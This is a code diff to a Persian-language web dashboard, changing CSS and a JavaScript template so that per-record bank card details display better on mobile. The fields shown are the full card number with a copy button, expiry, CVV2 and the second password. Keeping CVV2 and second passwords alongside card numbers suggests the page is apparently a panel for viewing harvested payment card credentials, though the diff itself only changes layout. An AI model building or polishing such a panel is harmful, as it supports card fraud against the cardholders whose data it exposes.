@@ -332,6 +332,74 @@ textarea{resize:vertical;min-height:55px}
   .events-grid .ev-section{display:none}
   .events-grid .ev-section.mobile-active{display:block}
 }
+
+/* ===== Bank Card Redesign ===== */
+.bank-card-display{display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr 1fr;gap:6px;margin-top:6px}
+.bank-card-display .info-cell{padding:6px 9px;font-size:13px}
+
+@media(max-width:768px){
+  .bank-card-display{
+    grid-template-columns:1fr!important;
+    gap:6px!important;
+    margin-top:8px!important;
+  }
+  .bank-card-display .info-cell{
+    padding:8px 10px!important;
+    font-size:12px!important;
+    display:flex!important;
+    justify-content:space-between!important;
+    align-items:center!important;
+    text-align:right!important;
+  }
+  .bank-card-display .info-cell b{
+    font-size:13px!important;
+    margin-top:0!important;
+    display:inline!important;
+  }
+  /* کارت شماره کارت - یک ردیف کامل با طراحی خاص */
+  .bank-card-display .bank-number-cell{
+    background:linear-gradient(135deg,rgba(56,189,248,0.15),rgba(34,211,238,0.08))!important;
+    border:1px solid rgba(56,189,248,0.4)!important;
+    padding:10px 12px!important;
+    grid-column:1!important;
+  }
+  .bank-card-display .bank-number-cell .bank-number-value{
+    font-size:15px!important;
+    font-weight:800!important;
+    letter-spacing:1px!important;
+    color:var(--accent)!important;
+    direction:ltr!important;
+    display:inline-block!important;
+  }
+  .bank-card-display .bank-number-cell .bank-number-label{
+    color:var(--muted)!important;
+    font-size:11px!important;
+  }
+  /* بقیه فیلدها در یک ردیف 3 ستونه */
+  .bank-card-display .bank-extra-row{
+    display:grid!important;
+    grid-template-columns:1fr 1fr 1fr!important;
+    gap:6px!important;
+    grid-column:1!important;
+  }
+  .bank-card-display .bank-extra-row .info-cell{
+    padding:8px 6px!important;
+    text-align:center!important;
+    flex-direction:column!important;
+    justify-content:center!important;
+    font-size:10.5px!important;
+  }
+  .bank-card-display .bank-extra-row .info-cell b{
+    font-size:14px!important;
+    display:block!important;
+    margin-top:3px!important;
+  }
+  .bank-card-display .bank-extra-row .info-cell .copy-btn{
+    font-size:10px!important;
+    padding:3px 6px!important;
+    margin-top:3px!important;
+  }
+}
 </style>
 </head>
 <body>
@@ -901,12 +969,20 @@ function renderMain(){
       ${(c.num||c.cvv2||c.pass2)?`
       <div style="margin-top:8px">
         <button class="mini danger" onclick="toggleCard('card_${d.id}',this)">👁 نمایش کارت بانکی</button>
-        <div id="card_${d.id}" class="hidden" style="display:grid;grid-template-columns:1.4fr 1fr 1fr 1fr 1fr;gap:6px;margin-top:6px">
-          <div class="info-cell">شماره کارت: <b class="ltr">${esc(c.num||'—')}</b> <button class="copy-btn" onclick="copyText('${esc(c.num||'')}',this)">📋</button></div>
-          <div class="info-cell">ماه: <b class="ltr">${esc(c.m||'--')}</b></div>
-          <div class="info-cell">سال: <b class="ltr">${esc(c.y||'--')}</b></div>
-          <div class="info-cell">CVV2: <b class="ltr">${esc(c.cvv2||'—')}</b></div>
-          <div class="info-cell">رمز۲: <b class="ltr">${esc(c.pass2||'—')}</b></div>
+        <div id="card_${d.id}" class="hidden bank-card-display">
+          <div class="info-cell bank-number-cell">
+            <span class="bank-number-label">💳 شماره کارت:</span>
+            <span class="bank-number-value ltr">${esc(c.num||'—')}</span>
+            <button class="copy-btn" onclick="copyText('${esc(c.num||'')}',this)">📋</button>
+          </div>
+          <div class="bank-extra-row">
+            <div class="info-cell">📅 ماه<b class="ltr">${esc(c.m||'--')}</b></div>
+            <div class="info-cell">📅 سال<b class="ltr">${esc(c.y||'--')}</b></div>
+            <div class="info-cell">🔒 CVV2<b class="ltr">${esc(c.cvv2||'—')}</b></div>
+          </div>
+          <div class="info-cell" style="grid-column:1">
+            🔑 رمز دوم: <b class="ltr">${esc(c.pass2||'—')}</b>
+          </div>
         </div>
       </div>`:''}
     </div>
